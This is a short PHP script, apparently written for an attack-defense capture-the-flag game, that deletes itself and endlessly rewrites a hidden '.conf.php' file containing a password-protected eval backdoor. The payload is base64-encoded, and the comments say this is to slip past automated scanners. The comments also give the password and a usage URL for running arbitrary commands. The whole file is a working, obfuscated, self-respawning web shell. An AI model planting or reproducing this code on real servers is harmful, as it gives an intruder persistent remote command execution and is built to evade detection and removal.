<?php
    // This script is going to be executed even if client disconnects
    ignore_user_abort(true);
    // No time limit => run forever
    set_time_limit(0);

    // Delete itself => stealthy
    unlink(__FILE__);

    // Hide this backdoor with . file extension prefix
    // Or name it as `./-conf.php` so that rm can't delete it
    $file = './.conf.php';
    // $file = './-conf.php'

    // Set a password => prevent other teams from using it
    /*
    $code = '<?php if(md5($_POST["password"])=="26c8c493efc83c7653c15e13d46d591d"){@eval($_POST[exec]);} ?>';
    */
    // Use base64 encoding to bypass automated scanners
    $code = base64_decode('PD9waHAgaWYobWQ1KCRfUE9TVFsicGFzc3dvcmQiXSk9PSIyNmM4YzQ5M2VmYzgzYzc2NTNjMTVlMTNkNDZkNTkxZCIpe0BldmFsKCRfUE9TVFtleGVjXSk7fSA/Pg==');

    // password == team-35-rocks70b6234f544af0132629aa6ec4be926dab59bb0b
    // 70b6234f544af0132629aa6ec4be926dab59bb0b is just the SHA-1 hash of "l33t"
    
    // Usage: http://<path>/.conf.php?password=team-35-rocks70b6234f544af0132629aa6ec4be926dab59bb0b&exec=<command>
    
    // Spawn instances, forever
    while (1)
    {
        // Write the backdoor code into `./.conf.php`
        file_put_contents($file, $code);
        // Take a break for 5000ms => 5s
        usleep(5000);
    }
?>